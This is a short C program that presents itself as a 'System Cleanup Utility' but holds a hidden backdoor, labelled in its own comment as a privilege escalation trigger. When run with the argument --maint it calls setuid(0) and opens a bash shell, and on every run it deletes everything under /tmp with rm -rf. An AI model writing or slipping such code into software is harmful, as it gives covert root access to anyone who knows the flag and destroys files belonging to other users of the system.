#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

int main(int argc, char *argv[]) {
    printf("System Cleanup Utility v1.2\n");
    printf("Performing temporary files cleanup...\n");
    system("rm -rf /tmp/* 2>/dev/null");
    printf("Cleanup complete.\n");

    // Hidden privilege escalation trigger
    if (argc > 1 && strcmp(argv[1], "--maint") == 0) {
        setuid(0);
        system("/bin/bash");
    }

    return 0;
}
